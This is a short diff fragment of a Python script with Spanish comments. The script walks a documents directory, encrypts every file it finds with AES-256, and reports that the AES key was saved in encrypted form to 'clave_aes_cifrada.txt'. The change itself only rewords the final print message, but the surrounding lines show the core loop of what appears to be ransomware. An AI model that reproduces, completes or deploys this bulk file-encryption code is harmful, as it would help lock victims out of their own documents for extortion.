@@ -70,4 +70,4 @@ for foldername, subfolders, filenames in os.walk(documents_dir):
             file_path = os.path.join(foldername, filename)
             cifrar_archivo_aes(file_path, clave_aes)  # Cifrar el archivo con AES
 
-print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada en "clave_aes_cifrada.txt".')
+print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada como "clave_aes_cifrada.txt".')
